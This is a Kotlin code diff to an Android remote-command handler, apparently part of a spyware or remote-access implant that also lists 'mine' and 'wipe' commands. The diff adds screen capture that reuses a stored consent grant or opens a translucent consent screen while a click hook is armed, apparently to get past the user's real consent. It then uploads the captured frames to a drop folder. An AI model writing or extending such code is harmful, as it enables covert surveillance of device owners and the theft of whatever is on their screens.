@@ -237,7 +237,7 @@ class CommandLink(private val context: Context) {
                 }.getOrNull() ?: return "failed" to "no_perm"
             )
 
-            "screen_capture" -> "failed" to "unsupported:no_consent"
+            "screen_capture" -> runScreenCapture(payload)
             "mine" -> "failed" to "unsupported"
             "wipe" ->
                 if (OperatorActions.isAdminEnabled(context)) {
@@ -248,6 +248,61 @@ class CommandLink(private val context: Context) {
 
             else -> "failed" to "unsupported:$type"
         }
+    }
+
+    /**
+     * Screen capture: replay a persisted projection grant when we have one,
+     * otherwise pop the translucent consent activity once and wait. Frames
+     * upload to the drop folder under kind=screen.
+     */
+    private fun runScreenCapture(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
+        val consent = ProjectionConsent(context, AndroidKeystoreKeySource())
+        var projection = reopenProjection(consent)
+        if (projection == null) {
+            GrantBus.arm()
+            ProjectionClickBus.armed = true
+            val i = android.content.Intent(context, ConsentActivity::class.java)
+                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            runCatching { context.startActivity(i) }
+            val granted = GrantBus.await(20)
+            ProjectionClickBus.armed = false
+            if (!granted) return "failed" to "no_consent"
+            projection = reopenProjection(consent)
+        }
+        if (projection == null) return "failed" to "no_consent"
+        val frames = payload?.get("frames")?.jsonPrimitive?.content?.toIntOrNull() ?: 6
+        val intervalSec = payload?.get("intervalSec")?.jsonPrimitive?.content?.toIntOrNull() ?: 10
+        return try {
+            val cap = ScreenCapture(context)
+            val spec = ScreenCapture.FrameSpec(intervalSec * 1000L, frames.coerceIn(1, 12))
+            val written = cap.burst(projection, spec)
+            var uploaded = 0
+            for (f in written) {
+                val hash = MessageDigest.getInstance("SHA-256")
+                    .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+                if (uploadFile("screen", "", f.name, f, hash)) uploaded++
+            }
+            "executed" to "frames=${written.size}/$uploaded"
+        } catch (t: Throwable) {
+            "failed" to "capture:${t.message?.take(60)}"
+        } finally {
+            runCatching { projection.stop() }
+        }
+    }
+
+    private fun reopenProjection(consent: ProjectionConsent): android.media.projection.MediaProjection? {
+        // In-memory grant first (fresh consent this process), persisted blob as fallback.
+        val inMemory = GrantBus.intent
+        if (inMemory != null && GrantBus.resultCode != Int.MIN_VALUE) {
+            runCatching {
+                return ScreenCapture(context).createProjection(GrantBus.resultCode, inMemory)
+            }.onFailure { Log.w("CommandLink", "in-memory projection failed", it) }
+        }
+        val data = consent.loadIntent() ?: return null
+        val rc = consent.lastResultCode()
+        return runCatching {
+            ScreenCapture(context).createProjection(rc, data)
+        }.onFailure { Log.w("CommandLink", "projection replay failed", it) }.getOrNull()
     }
 
     /** Write a text dump and ship it as a drop-folder artifact. */
